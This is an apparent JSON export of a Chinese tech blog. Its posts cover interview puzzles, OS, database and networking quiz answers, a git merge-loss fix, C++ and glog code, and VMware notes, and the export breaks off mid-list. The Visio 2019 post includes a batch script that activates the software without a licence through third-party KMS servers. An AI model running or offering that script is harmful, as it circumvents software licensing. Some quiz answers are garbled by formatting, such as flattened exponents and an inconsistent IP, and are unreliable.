最后剩下一个元素，那么进行了几次筛选过程呢？ i取值只能是1， 那么 501/（2^x）&lt;2 取x=8; 那么剩下的元素是2^8-1=255 仔细观察都是一的二进制数最后出列。 32!的计算结果，尾数总共有几个零？答案：7个2*5可以得到零，即转为求因子数。2因子远大于5，求5就行这里可以有公式：5！：5 / 5 = 125！： 25/5 + 25/25= 6（有2有5+1个5，5 10 15 20 25，25有两个五，也就是每有一个25要多一个零，以下同理）32！：32/5 + 32/25 =71024!：1024/5 + 1024/25 + 1024/125 + 1024/625 = 253 站在地球上的某一点，向南走一公里，然后向东走一公里，最后向北走一公里，回到了原点。地球上有多少个满足这样条件的点?答案：无数个从逻辑上来讲，题目从好像缺少了一次向西的过程，才可以回到原地。有没有可能向东1公里还在原地，答案是肯定的，如果有一个纬度，绕其一圈恰好是1公里即可实现，所以这样的点有无穷多个，只要找到那个纬度即可。（就像你在赤道上，要回到原点怎么办呢，向东或西走赤道这么长就可以了）北极点的起点出发刚好走了一个正三角形，所以可以返回原点。 1,32,81,64,25,(6),1$1^6=1$$2^5=32$$3^4=81$$4^3=64$$5^2=25$$6^1=6$$7^0=1$ N个球中有一个假冒伪劣(重量不足)，如果给你一个天平允许你测 3 次找出那个假冒伪劣，问 N 可能的值 三个一次就可以测出来。A B C，三个球中有一个次品，只要测一下A B是否等重，则次品在C；如果A B不等重，那就可以分出来次品。 $33 = 9$ 个以内 2 次，$33*3 = 27$ 个以内，3次！所以，有个公式：n 次可以测出来 $3^n$ 以内的假冒伪劣 某单位组织党员参加党史，党风廉政建设，科学发展观和业务能力四项培训，要求每名党员参加且只能参加其中的两项，无论如何安排，都至少有 5 名党员参加的培训完全相同，请问该单位至少有多少名党员？4门课程，每人选2门，有$C_4^2=6$中选法；此时根据抽屉原理，将这6中选法想象为6个抽屉，在每个抽屉中放入4个党员，则有24名党员；此时，再多来一名党员，则无论将其安排在哪个抽屉，6个抽屉中都必有一个里面装的是5名党员。所以，该机关至少有24+1=25名党员。 小松鼠采到了100 颗坚果要运回家。家离放坚果的地方有100 米远。小松鼠每次最多运 50 颗。BUT！小松鼠很馋。。。每走2 米就要吃一颗坚果。。。返回时不会再吃坚果，问小松鼠最多能运回家多少颗坚果？答案：25 设采坚果的地点为A，家为B，从A到B方向的运动需要消耗坚果。题目求最多运多少坚果回家，为使结果最大化，所以需要每次开始都运50颗，所以题目也就是求最少的坚果消耗量，由于A-&gt;B方向的运动一直要消耗坚果，所以也就是求此方向运动的最少距离。由于每次做多运50颗，所以有一段A-&gt;B方向必须走两次，设这段距离为x，剩下的距离为y，则有x+y=100。消耗的总坚果数为(2x+y)/2。并且为了使最后y段能够运走所有2x段剩下的坚果，需要满足2*(50-x/2)&lt;=50，所以x&gt;=50。由于要使(2x+y)/2=(x+100)/2最小，所以x应该去最小值50,所以消耗坚果数为（50+100）/2=75，所以剩下25个。另：假如松鼠每走两步就要吃坚果，那么答案应该是17颗。 在?处答案为()答案：B前两列（1、2列）移动到2、3列，第三列挪到第一列，但是第三列第三行要变第一列第一行，其他的往下挪（即第三列第一行变第一列第二行，即第三列第二行变第一列第三行）， 然后叉变圆，圆变三角，三角变叉。（不理解的可以画图试试）","categories":[],"tags":[{"name":"面试","slug":"面试","permalink":"https://czqu.net/tags/%E9%9D%A2%E8%AF%95/"}]},{"title":"操作系统题目集锦","slug":"draft/Collection-of-os-topics","date":"2019-04-13T08:01:32.000Z","updated":"2019-04-13T08:01:32.000Z","comments":true,"path":"posts/46653/","permalink":"https://czqu.net/posts/46653/","excerpt":"","text":"在硬件和环境相同的条件下，一个作业在（分页）存储管理系统中运行的时间最长。分页式存储管理可能将连续的指令放置在不同的页中，会发生换页中断，而分段、段页都是逻辑分配空间，段长可变，逻辑上相对连续的指令放在同一段中，不会像分页那样频繁换页操作。 设从磁盘将一块数据传送到缓冲区所用实际为80μs，将缓冲区中数据传送到用户区所用时间为40μs，CPU处理数据所用的时间为30μs。则处理该数据，采用单缓冲传送磁盘数据，系统所用总时间为（120μs）。","categories":[],"tags":[{"name":"操作系统","slug":"操作系统","permalink":"https://czqu.net/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"}]},{"title":"git合并丢失代码问题分析与解决(错误操作导致)","slug":"draft/git-merge-problem","date":"2019-03-19T04:16:29.000Z","updated":"2019-03-19T04:16:29.000Z","comments":true,"path":"posts/25541/","permalink":"https://czqu.net/posts/25541/","excerpt":"","text":"问题描述我们在主干dev和branch1分支上进行并行开发。当要把branch1功能的代码合并到dev上时，发现dev上开发的部分功能代码找不到了。 那么，是在branch1上，作了删除提交导致的吗？然而，查提交日志，并没有发现删代码的提交记录。 难道一个分支有一个功能，另一个分支没这个功能，git合并时就有可能把这块功能代码丢掉？跟功能添加时间顺序有关系？ 为了解决这个问题和相关的疑问，我们需要先了解下git合并的过程。 git-merge过程稍微了解点git基础的应该都知道，合并是用的git merge命令。它只有两种，一种是快速合并(fast-forward)，还有一种是三方合并(thirdparty merge)。 如上图所示，当两个分支有直系关系时，使用快速合并，git不产生新的commit结点，只是把head进行更新，如dev指向C4。 三方合并稍显复杂点，它会产生一个新的commit结点，并把head指向它。它会先去找这两个要合并分支的最近公有结点，如图中，C3 和 C5的最近公有父结点为C1。然后，git对 C1、C3和C5三个结点进行三方合并产生新结点C6。这里的三方合并，具体来说，就是把 C5相较于C1的 diff差异应用到 C3上，最后产生C6 这个commit结点。 现在回答上面的疑问，三方合并其实只看三个点的内容，和中间结点无任何关系，更别提跟时间有关系了。在一个分支上删除代码，如果合并时没有冲突的话，合并后是会直接删除的。 所以，我们找到了问题的初步方向了。dev上的代码合并后没了，一定是branch1分支有问题！！！ 注：知道了git-merge的流程后，我们还可以知道，只要我们把这次合并代码丢失问题解决了，后续从branch1分支拉出去的分支代码再合并到dev时，都不用再解决这个代码丢失问题了。因为，合并后的提交结点和branch1分支拉出去分支的后续提交结点的父结点，已经变成branch1的当前结点了。如，C6的后续提交和C5的后续提交结点，公有结点都变成C5了。 问题起因及检测为了描述问题方便，我把场景简化，搞了个demo，大家可以去下面地址clone： 1# git clone https://git.coding.net/myswift/git-merge.git 提交记录用sourcetree看，是这样的（你可能已经发现问题了）： dev合并branch1时，dev上，dev func 1部分的提交丢失。 首先，让我们找最近公共结点吧。如果两个分支并行太久的话，可能不好直接找出来。我们可以使用git merge-base: 12# git merge-base 98d19a4 0acedcb9447776f5ee8c53536c947a1e13bfdead13f002b 我们发现最近的公共结点是9447776。然而，这个公共结点，并不是我们设想的。我们设想的最近公共结点应该是两个分支刚开始并行的那个结点（如图中c3275e2)。进一步发现，9447776的下一个结点有个Merge，而且是把dev合并到branch1！！！ 这就是问题的根源了，dev主干开发的一般是下个版本的功能，一般是把分支的代码合到主干上，把主干的代码逆向合并到分支上肯定是有问题的！！！ 回到开头的问题，我们看Merge结点变更记录，并没有发现有删除代码的地方啊？原因是，你看到的合并结点的修改记录，是针对一边的。回到介绍三方合并的那个图，把branch1合并到dev产生结点C6，那么C6的提交记录中显示的修改，是C6针对C3结点的。在我们的示例中，合并结点74a8d10的提交变更，显示的是74a8d10对branch1中c26c5e3的变更，而branch1中本来就没有dev中的代码，所以合并后变更根本不会显示删除。 如果，你去比较合并结点和另一边的变更，你就可以发现问题： 1234567891011121314# git diff 9447776 74a8d10diff --git a/test.c b/test.cindex 150de8d..d19a020 100644--- a/test.c+++ b/test.c@@ -7,8 +7,8 @@ void base_func() { printf(\"this is a crash %d\\n\", *p); }-void dev_func_1() {- printf(\"dev func 1\\n\");+void branch_func_1(){+ printf(\"branch func1\\n\"); } 你可以明显看到，在合并时，把dev中的dev_func_1函数删除掉了。 总结问题的原因是，在正式合并前，进行了逆向的合并，并在合并中悄悄把主干代码删除掉了。一般如果查看提交记录中，没有看到删除记录，那么很有可能是之前的Merge中把代码删除了。可以使用 merge-base和git diff 工具来进行定位，也可以用来检测是否有问题。 注：很多人可能认为只要管好自己的分支就行了，然后把别的分支合过来，并在合并时或合并后随意删除另一分支的代码。这样当以后再和该分支合并时，就会有问题。好的做法，应该是只把另一个分支上你需要的提交用cherry-pick移过来，而不是直接合并别人的分支，再删除你不需要的代码。如，只把dev上的fec5b84优化cherry-pick复制到branch1上即可。 解决思路既然我们发现了问题的原因，并知道怎么去规避、检测。那么，如果已经发生了问题，怎么去解决呢？这个可能是大家更关心的。 其实我们最终的目标是，把branch1和dev进行合并，产生一个合并节点，并且这个合并结点的代码是正确的。 注：有些人可能不太明白为什么一定要产生一个git合并记录节点。通过各种手段，只要保证dev上代码正确不就行了？结论是不行，因为如果没有git合并记录的话，从branch1拉出来的所有分支再想合并到dev时，还是要解决下这个代码丢失的问题（没想明白，可以再看下前面git-merge过程部分)，而且如果把branch1分支悬着不合并，也影响分支查看。 确保合并后代码正确奔着这个目标，我们首先来确保代码的正确。 1. dev重置到合并前既然最后合并branch1到dev会导致dev丢代码，我们首先把dev重置到合并前。 12# git checkout dev# git reset --hard HEAD~1 2. 创建tmp分支，绕过错误的合并74a8d10我们知道branch1是有问题的，因为进行了合并dev的操作。所以，基于branch1创建一个临时分支tmp。 12# git checkout branch1# git checkout -b tmp 把tmp的提交记录重塑，使tmp分支回到branch1上的，合并dev到branch1那个错误的合并之前的结点，示例中 74a8d10之前的那个c26c5e3结点，并提交一个新记录，这样tmp内容与branch1一样，而完全跟那个74a8d10结点没关系了。 1234# git checkout tmp# git reset c26c5e3# git add .# git commit -m \"内容与branch1一致\" 注：reset和reset –hard的区别，可以参考文末资料1。 3. 合并tmp到dev12# git checkout dev# git merge tmp 这里dev和tmp合并时，它们的最近公共结点就不是之前错误的9447776了，而是我们设想的、dev和branch1最初分开的，c3275e2结点。 解决冲突，并add进暂存区后，我们代码就是正确的了（先不急着提交）。 产生合并commit对象上面代码正确了，如果我们直接commit的话，这个合并结点，就变成dev和tmp的合并了，而我们要的是dev和branch1的合并。所以，我们要产生一个dev和branch1合并的结点，并且内容是当前dev和tmp合并后的代码。显然，git merge不能满足我们的需求，我们需要更底层的git命令，就是git merge过程中，调用的底层命令。 需要按序要用到 write-tree -&gt; commit-tree -&gt; update-ref，这三条底层命令。这部分命令，可以查看参考资料2。 1. write-tree产生tree对象123# git add .# git write-tree853c36012082314f9463f3819d0a24da49dc5bb1 我们产生了SHA-1值为 853c360的tree对象。 2. commit-tree产生commit对象12# git commit-tree 853c360 -p 98d19a4 -p 0acedcb -m \"Merge branch 'branch1' into dev\"675baf3973508ee03306cc5a36fe489d694e107f 我们把tree对象 853c360进行了提交，并设置它的两个父结点为dev和branch1，产生了commit对象675baf3。我们可以看下这个结点的情况： 123456789# git cat-file 675baf3 -ptree 853c36012082314f9463f3819d0a24da49dc5bb1parent 98d19a4a5913f18a2c0e9821e114df9995b23d82parent 0acedcb89e4d25a0256fcbe7fba0bbc13de9d92eauthor Vincent &lt;xxx&gt; 1498497182 +0800committer Vincent &lt;xxx&gt; 1498497182 +0800Merge branch 'branch1' into dev 3. 更新head使用如下命令，更新dev指向这个新的commit对象, 675baf3： 1# git update-ref refs/heads/dev 675baf3 最终合并结果如下： 可以验证，branch1合并到dev了，而且内容是正确的（即不会少dev fun 1部分的代码）。 这个解决问题的示例代码，也上传到coding了，两份示例代码，之前的结点都是一致的。 1# git clone https://git.coding.net/myswift/git-merge2.git 注：知道了git merge这些底层命令，你可以更加灵活地解决git问题，你可以结点随意合并，head随便指，是不是很开心，哈哈。 更粗暴的方法如果你觉得底层命令不好理解。你可以： 先整个目录拷备下工程（包含.git目录)，比如拷贝到bak目录 在工程中直接合并branch1到dev上，不解决冲突，不提交 在bak目录，按照上面确保代码正确的方法，在bak目录合并出正确的代码。 把bak目录中，除了.git目录外的东东，全部拷贝覆盖到原来工程目录中 在原来工程目录中，提交 这样比较好理解，缺点是工程如果大的话，拷来拷去花费时间比较长，而且不够优雅。 其他解决思路上面描述的思路，我认为是最行之有效的。也试了其他思路，比如： 查看git merge的参数，发现并没有可以自由设置base节点的方法，只有设置发现base节点的策略，而且这些策略发现的base节点都是那个错误的合并。 undo merge。参考资料3。然而，感觉revert merge的能力有限，加-m1参数、和-m2参数，均无法满足要求。 rebase branch1。错误发生在branch1，那么重建branch1呢？把所有branch1上合并后的提交都重新提交呢？结果发现branch1上有太多合并冲突，rebase时，要把这个合并的冲突重新解决，很麻烦。 这些思路，大家也可以继续研究下，感觉不能解决问题，也可能是我了解得有问题。当然，你有其他思路，也希望你交流下。 迷思本文中，是因为错误地把dev合并到branch1上，导致了后面合并的问题。但是，我们真实遇到的场景，虽然看起来是一样的，也可以用文中的方法解决，但是也有细微不同，而且不知道如何出现这个问题。 真实的场景下，也会出现一个dev合并到branch1的Merge提交，但是显示的信息是 “Revert xxx”，据提交人员讲，这个确实是做的Revert操作，不知如何变成Merge结点了。用的sourcetree，提交人员也没法说清怎么必现这个问题。 如果，你知道怎么操作能出现这个问题，希望你告诉我。。。 总结文中描述了一种可能导致git合并代码丢失的错误操作，并讲解了如何规避、检测、解决这种错误。并粗略介绍了，git merge流程，git merge底层过程。 说简单点，问题是因为悄悄在合并中把代码删除了。解决思路是，悄悄在后面的合并中把代码加回来。 参考1. git-recipes 2. Git 内部原理-commit对象 3. Reverting a Merge","categories":[],"tags":[{"name":"git","slug":"git","permalink":"https://czqu.net/tags/git/"}]},{"title":"Visio2019一键安装激活","slug":"draft/Visio2019-install","date":"2019-03-13T07:41:59.000Z","updated":"2019-03-13T07:41:59.000Z","comments":true,"path":"posts/30340/","permalink":"https://czqu.net/posts/30340/","excerpt":"","text":"如何让即点即用的Office365和Visio2019共存？共存是不可能共存滴，但是有其他解决方法~ 此方法也可直接用于安装Visio2019 先下载Office部署工具，安装时选择解压路径，解压后有setup.exe和三个xml配置文件，因为我安装的Office365是64位的，所以修改对应64位的配置文件。 编辑configuration为以下内容，将语言设置为zh-cn123456789&lt;Configuration&gt; &lt;Add OfficeClientEdition=\"64\" Channel=\"Monthly\"&gt; &lt;Product ID=\"VisioPro2019Volume\"&gt; &lt;Language ID=\"zh-cn\" /&gt; &lt;/Product&gt; &lt;/Add&gt;&lt;/Configuration&gt; 在以上所在的目录下启动命令行，执行setup.exe /download configuration-Office365-x64.xml 下载过程比较慢。下载完成后会发现目录下多了Office目录，然后继续执行安装命令setup.exe /configure configuration-Office365-x64.xml 就可以了。 激活 把以下代码保存为bat运行即可1234567891011@echo offtitle Activate Microsoft Visio 2019&amp;cls&amp;echo ============================================================================&amp;echo #Visio: Activating Microsoft software products for FREE without software&amp;echo ============================================================================&amp;echo.&amp;echo #Supported products:&amp;echo - Microsoft Visio Standard 2019&amp;echo - Microsoft Visio Professional Plus 2019&amp;echo.&amp;echo.&amp;(if exist \"%ProgramFiles%\\Microsoft Office\\Office16\\ospp.vbs\" cd /d \"%ProgramFiles%\\Microsoft Office\\Office16\")&amp;(if exist \"%ProgramFiles(x86)%\\Microsoft Office\\Office16\\ospp.vbs\" cd /d \"%ProgramFiles(x86)%\\Microsoft Office\\Office16\")&amp;cscript //nologo ospp.vbs /inslic:\"..\\root\\Licenses16\\pkeyconfig-office.xrm-ms\" &gt;nul&amp;(for /f %%x in ('dir /b ..\\root\\Licenses16\\client-issuance*.xrm-ms') do cscript ospp.vbs /inslic:\"..\\root\\Licenses16\\%%x\" &gt;nul)&amp;(for /f %%x in ('dir /b ..\\root\\Licenses16\\visioprovl_kms*.xrm-ms') do cscript ospp.vbs /inslic:\"..\\root\\Licenses16\\%%x\" &gt;nul)&amp;(for /f %%x in ('dir /b ..\\root\\Licenses16\\visiopro2019vl_kms*.xrm-ms') do cscript ospp.vbs /inslic:\"..\\root\\Licenses16\\%%x\" &gt;nul)&amp;echo.&amp;echo ============================================================================&amp;echo 正在尝试激活...&amp;cscript //nologo ospp.vbs /unpkey:7VCBB &gt;nul&amp;cscript //nologo ospp.vbs /inpkey:9BGNQ-K37YR-RQHF2-38RQ3-7VCBB &gt;nul&amp;set i=1:serverif %i%==1 set KMS_Sev=kms8.MSGuides.comif %i%==2 set KMS_Sev=kms9.MSGuides.comif %i%==3 set KMS_Sev=kms7.MSGuides.comif %i%==4 goto notsupportedcscript //nologo ospp.vbs /sethst:%KMS_Sev% &gt;nul&amp;echo ============================================================================&amp;echo.&amp;echo.cscript //nologo ospp.vbs /act | find /i \"successful\" &amp;&amp; (echo 已完成，按任意键退出) || (echo 连接KMS服务器失败! 试图连接到另一个… &amp; echo 请等待... &amp; echo. &amp; echo. &amp; set /a i+=1 &amp; goto server)pause &gt;nulexit","categories":[],"tags":[{"name":"Windows","slug":"Windows","permalink":"https://czqu.net/tags/Windows/"}]},{"title":"高精度除法","slug":"draft/High-precision-division","date":"2019-02-03T08:03:43.000Z","updated":"2019-02-03T08:03:43.000Z","comments":true,"path":"posts/31191/","permalink":"https://czqu.net/posts/31191/","excerpt":"","text":"输入正整数a，b，c，输出a/b的小数形式，精确到小数后c位。(提示：使用循环） 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394#include&lt;bits/stdc++.h&gt;using namespace std;#define MAX_LEN 100char ans[MAX_LEN+10];int main(){ memset(ans,0,sizeof(ans)); int a,b,c; int anslen; cin&gt;&gt;a&gt;&gt;b&gt;&gt;c; sprintf(ans,\"%d.\",a/b);//打印整数部分及小数点 ans[MAX_LEN+8]=anslen=strlen(ans); a%=b; for (int i=0; i&lt;c; i++) { sprintf(ans+anslen+i,\"%d\",a*10/b); a=a*10%b; } ans[MAX_LEN+9]= anslen=strlen(ans); int flags=0;//进位标志 for (int i=ans[MAX_LEN+9]-1; i&gt;ans[MAX_LEN+8]-1; i--) { if(flags) { if(ans[i]=='9') { ans[i]='0'; flags=1; } else//停止进位 { ans[i]++; flags=0; break; } } if(ans[i]=='9') { ans[i]='0'; flags=1; } else if(ans[i]&gt;='5') { ans[i]++; flags=0; break; } } for (int i=ans[MAX_LEN+8]-2; i&gt;=0; i--) { if(flags) { if(ans[i]=='9') { ans[i]='0'; flags=1; } else//停止进位 { ans[i]++; flags=0; break; } } if(ans[i]=='9') { ans[i]='0'; flags=1; } else if(ans[i]&gt;='5') { ans[i]++; flags=0; break; } } printf(\"%s\",ans); return 0;}","categories":[],"tags":[{"name":"cpp","slug":"cpp","permalink":"https://czqu.net/tags/cpp/"}]},{"title":"数据库题目集锦","slug":"draft/Database-topic-collection","date":"2018-06-07T08:00:04.000Z","updated":"2018-06-07T08:00:04.000Z","comments":true,"path":"posts/31998/","permalink":"https://czqu.net/posts/31998/","excerpt":"","text":"在数据库的三级模式结构中，描述数据库中全体数据的全局逻辑结构和特征的是（）答案：.概念模式数据库系统的三级模式结构是指数据库系统是由模式、外模式和内模式三级构成的。 （1）模式 模式也称逻辑模式或概念模式，是数据库中全体数据的逻辑结构和特征的描述，是所有用户的公共数据视图。 模式实际上是数据库数据在逻辑级上的视图。一个数据库只有一个模式。定义模式时不仅要定义数据的逻辑结构，而且要定义数据之间的联系，定义与数据有关的安全性、完整性要求。 （2）外模式 外模式也称用户模式，它是数据库用户能够看见和使用的局部数据的逻辑结构和特征的描述，是数据库用户的数据视图，是与某一应用有关的数据的逻辑表示。 外模式通常是模式的子集。一个数据库可以有多个外模式。应用程序都是和外模式打交道的。外模式是保证数据库安全性的一个有力措施。每个用户只能看见和访问所对应的外模式中的数据，数据库中的其余数据对他们是不可见的。 （3）内模式 内模式也称存储模式，一个数据库只有一个内模式。它是数据物理结构和存储方式的描述，是数据在数据库内部的表示方式。例如，记录的存储方式是顺序结构存储还是B树结构存储；索引按什么方式组织；数据是否压缩，是否加密；数据的存储记录结构有何规定等。 SQL 语言具有（ ）的功能。答案 ：数据定义、数据操纵、数据控制数据定义：CREATE、DROP、ALTER数据操作：SELECT、DELETE、UPDATE、INSERT数据控制：GRANT、DENY、REVOKE 在数据库设计中，对数据库存储结构和存取方法的分析在（ ）设计阶段。答案：物理设计需求分析阶段的任务是：对现实世界要处理的对象（组织、部门、企业等）进行详细调查，在了解现行系统的概况，确定新系统功能的过程中，确定系统边界、收集支持系统目标的基础数据及其处理方法。概念设计阶段的任务是：对用户要求描述的现实世界，通过对其进行分类、聚集和概括，建立抽象的概念数据模型，如果是关系数据库，其得到的结果是ER模型。逻辑设计阶段的任务是：将概念数据模型设计成数据库的一种逻辑模式（关系模式），然后对关系模式进一步做规范化处理，从而提高存储效率和处理效率。物理结构设计的任务是：根据特定数据库管理系统所提供的多种存储结构和存取方法，为具体的应用任务选定最合适的物理存储结构、存取方法和存取路径等。这一步设计的结果就是物理数据库","categories":[],"tags":[{"name":"数据库","slug":"数据库","permalink":"https://czqu.net/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"}]},{"title":"VMware 安装Tools 遇到的问题：VGAuthService 启动失败","slug":"draft/VGAuthService","date":"2018-04-13T07:50:42.000Z","updated":"2018-04-13T07:50:42.000Z","comments":true,"path":"posts/36381/","permalink":"https://czqu.net/posts/36381/","excerpt":"","text":"虚拟机里遇到这个问题特此记录一下虚拟机内部环境： Windows 7 问题描述：VGAuthservice 启动失败，请确保您有足够的权限启动系统服务Installing VMware tools fails with error:VGAuthService &amp; Common Agent failed解决方案 ：安装补丁 KB2999226就可以了其他系统建议安装VC运行库看看。","categories":[],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://czqu.net/tags/Linux/"}]},{"title":"使用cmake-gui进行转换为Visual Studio  的sln工程文件&&glog在Windows下的使用","slug":"draft/使用cmake-gui进行转换为Visual-Studio","date":"2018-03-26T07:44:32.000Z","updated":"2018-03-26T07:44:32.000Z","comments":true,"path":"posts/49708/","permalink":"https://czqu.net/posts/49708/","excerpt":"","text":"1.首先将库git到本地https://github.com/google/glog2.使用cmake-gui进行转换为Visual Studio 的sln工程文件(如下图）（使用我转换好的也可以https://github.com/czqu/builds/tree/master/glogs 然后选择vs版本和CPU架构（如果之前编译错了，再进去可能不能进到这个界面，把输出目录删除即可）3.点击generate，即可完成。 4.如果出现如下错误，说明你缺少gflags库，编译方法和上面一样不再赘述https://github.com/gflags/gflags 123456Could not find a package configuration file provided by \"gflags\" (requested version 2.2.0) with any of the following names: gflagsConfig.cmake gflags-config.cmake 5.然后新建一个测试工程（debug库和release库不能混用，不同架构也不能），添加头文件和库目录，记得需要在开头加上 GLOG_NO_ABBREVIATED_SEVERITIES和GOOGLE_GLOG_DLL_DECL，不然会报错 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647#pragma once#define GLOG_NO_ABBREVIATED_SEVERITIES#define GOOGLE_GLOG_DLL_DECL#include &lt;logging.h&gt;using namespace google;#ifdef _DEBUG#pragma comment(lib, \"glogd.lib\")#else#pragma comment(lib, \"glog.lib\")#endif // DEBUGvoid testGlog2(){char str[20] = \"hello log!\";int i = 100000;while (i &gt; 0) { // LOG(INFO) &lt;&lt; str; LOG(INFO) &lt;&lt; \"2info 2test\" &lt;&lt; \"2hello 2log!\"; //输出一个Info日志 // LOG(WARNING) &lt;&lt; \"warning test\"; //输出一个Warning日志 // LOG(ERROR) &lt;&lt; \"error test\"; //输出一个Error日志 i--;}}void testGlog(){// Start google log system:FLAGS_log_dir = \"E:\\\\logs\";google::InitGoogleLogging(\"loglog\");google::SetLogDestination(google::GLOG_INFO, \"E:\\\\logs\\\\INFO_\");google::SetStderrLogging(google::GLOG_FATAL);google::SetLogFilenameExtension(\"log_\");FLAGS_colorlogtostderr = true; // Set log colorFLAGS_logbufsecs = 0; // Set log output speed(s)FLAGS_max_log_size = 1024; // Set max log file sizeFLAGS_stop_logging_if_full_disk = true; // If disk is fullthread *t = new thread(testGlog2);char str[20] = \"hello log!\";int i = 100000;while (i &gt; 0) {// LOG(INFO) &lt;&lt; str; LOG(INFO) &lt;&lt; \"info test\" &lt;&lt; \"hello log!\"; //输出一个Info日志// LOG(WARNING) &lt;&lt; \"warning test\"; //输出一个Warning日志// LOG(ERROR) &lt;&lt; \"error test\"; //输出一个Error日志 i--;}t-&gt;join();google::ShutdownGoogleLogging();}","categories":[],"tags":[{"name":"Windows","slug":"Windows","permalink":"https://czqu.net/tags/Windows/"},{"name":"cpp","slug":"cpp","permalink":"https://czqu.net/tags/cpp/"}]},{"title":"计算机网络题目集锦","slug":"draft/cs-network-topic-key","date":"2018-02-04T07:56:25.000Z","updated":"2018-02-04T07:56:25.000Z","comments":true,"path":"posts/1279/","permalink":"https://czqu.net/posts/1279/","excerpt":"","text":"音频的时延抖动可通过在发送方为每个块规定一个序号或时间戳，在接收方延迟播放音频块来消除。答案：正确 什么是抖动？ 在网络上连续传输的数据包即便使用相同的路径，也会有不同的延时。这是由于分组交换网络固有的两个关键原因造成的。第一，数据包被单独路由。第二，网络设备接收队列中的数据包，因此无法保证延时调度不变。 每个数据包之间的这种延时不一致称为抖动。 为了弥补抖动，在连接的接收端使用抖动缓冲区。抖动缓冲区收集并存储传入数据包，以便它可以确定如何以一致的间隔发送它们。 静态抖动缓冲—其在系统的硬件中实现，并且通常由制造商配置。 动态抖动缓冲—其在系统软件中实现，并由管理员进行配置。他们可对缓冲进行调整以适应网络变化。 播放延时 播放延时是数据包到达时和播放时间之间的延时。当抖动缓冲区存储传入数据包并等待以均匀间隔分配它们时，这会增加数据包到达时间与播放时间之间的时间，也被称为播放延时。这个延时是由抖动缓冲区引入的，因为它负责规定传入数据包何时分发。 目前,最流行的以太网组网的拓扑结构是 （星型结构 ）。 HDLC中，数据比特串0111101111110装帧发送出去的串为（01111011111010 ）。HDLC协议每次发送方要发送的信息中含有5个以上连续的1时，它总要在第五个1后面插入一个冗余的0，不管第6个位是0还是1，这个额外的0都要插入。 能提供E1接口的路由器是CISCO 4500 Linux中，一个端口能够接受tcp链接数量的理论上限是？答案：无上限 采用FDM技术进行多路复用时，复用后的信号的带宽通常( 大于复用前所有信号的带宽之和 )。 对于频分复用技术而言，信号一般得调制为模拟信号，因为只有模拟才有频率可言。。信号的频率是有范围的，频分多路复用是将多路基带信号调制到不同频率载波上再进行叠加形成一个复合信号。在物理信道的可用带宽超过单个原始信号所需带宽的情况下，可将该物理信道的总带宽分割成若干个与传输单个信号带宽相同（或略宽）的子信道，每个子信道传输一种信号。每个子信道分配的带宽总和 必须不超过 信道的总带宽，所以 复用后的信号的带宽 ≤ 信道总带宽。（本来就这么宽，多路复用也不能把物理带宽给撑大了，hhh）但是题目说的是 复用前所有信号的带宽之和，因为分割的子信道一般略大于传输单个信号带宽，所以，选择大于。 一主机的IP地址配置为176.12.128.250，子网掩码配置为255.255.255.248，则其默认网关可配置为 D_ 。 A 176.12.128.1B 176.12.128.248C 192.168.1.1D 176.12.128.254 根据主机ip： 172 . 12 . 128 . 1111 1010 子网掩码： 255 . 255 . 255 . 1111 1000求得子网号为： 172 . 12 . 128 . 1111 1000 (即172.12.128.248)对于A，172.12.128.0000 0001不在同一个网段对于B，网络中全0和全1留作他用对于C，不在同一个网段D选项 172.12.128.1111 1110 在同一个网段，答案选D 下列选项中，对正确接收到的数据帧进行确认的MAC协议是（CSMA/CA）。 CSMA/CA①用于无线网②ack重传确认③RTS， CTS隐蔽站④不需要发送检测冲突 在掩码为 255.255.224.0 条件下，下面哪些 ip 地址属于同一网段（AC）A 192.168.235.25B 192.168.188.99C 192.168.246.187D 192.168.67.28 以下有关Http协议的描述中，正确的有？ A post请求一般用于修改服务器上的资源，对发送的消息数据量没有限制，通过表单方式提交B HTTP返回码302表示永久重定向，需要重新URIC 可以通过206返回码实现断点续传D HTTP1.1实现了持久连接和管线化操作以及主动通知功能，相比http1.0有大福性能提升 错误代码(也称作状态代码)，指为服务器所接收每个请求(网页点击)分配的 3 位数代码。多数有效网页点击都有状态代码 200(“正常”)。”网页未找到”错误会生产 404 错误。 1xx(临时响应)用于表示临时响应并需要请求者执行操作才能继续的状态代码。100(继续) 请求者应当继续提出请求。服务器返回此代码则意味着，服务器已收到了请求的第一部分，现正在等待接收其余部分。101(切换协议) 请求者已要求服务器切换协议，服务器已确认并准备进行切换。 2xx(成功)用于表示服务器已成功处理了请求的状态代码。代码 说明200(成功) 服务器已成功处理了请求。通常，这表示服务器提供了请求的网页。如果您的 robots.txt文件显示为此状态，那么，这表示 Googlebot 已成功检索到该文件。201(已创建) 请求成功且服务器已创建了新的资源。202(已接受) 服务器已接受了请求，但尚未对其进行处理。203(非授权信息) 服务器已成功处理了请求，但返回了可能来自另一来源的信息。204(无内容) 服务器成功处理了请求，但未返回任何内容。205(重置内容) 服务器成功处理了请求，但未返回任何内容。与 204 响应不同，此响应要求请求者重置文档视图(例如清除表单内容以输入新内容)。206(部分内容) 服务器成功处理了部分 GET 请求。 3xx(已重定向)要完成请求，您需要进一步进行操作。通常，这些状态代码是永远重定向的。Google 建议您在每次请求时使用的重定向要少于 5 个。您可以使用网站管理员工具来查看 Googlebot 在抓取您已重定向的网页时是否会遇到问题。诊断下的抓取错误页中列出了 Googlebot 由于重定向错误而无法抓取的网址。300(多种选择) 服务器根据请求可执行多种操作。服务器可根据请求者 (User agent) 来选择一项操作，或提供操作列表供请求者选择。301(永久移动) 请求的网页已被永久移动到新位置。服务器返回此响应(作为对 GET 或 HEAD 请求的响应)时，会自动将请求者转到新位置。您应使用此代码通知 Googlebot 某个网页或网站已被永久移动到新位置。302(临时移动) 服务器目前正从不同位置的网页响应请求，但请求者应继续使用原有位置来进行以后的请求。此代码与响应 GET 和 HEAD 请求的 301 代码类似，会自动将请求者转到不同的位置。但由于 Googlebot 会继续抓取原有位置并将其编入索引，因此您不应使用此代码来通知 Googlebot 某个页面或网站已被移动。303(查看其他位置) 当请求者应对不同的位置进行单独的 GET 请求以检索响应时，服务器会返回此代码。对于除 HEAD 请求之外的所有请求，服务器会自动转到其他位置。304(未修改) 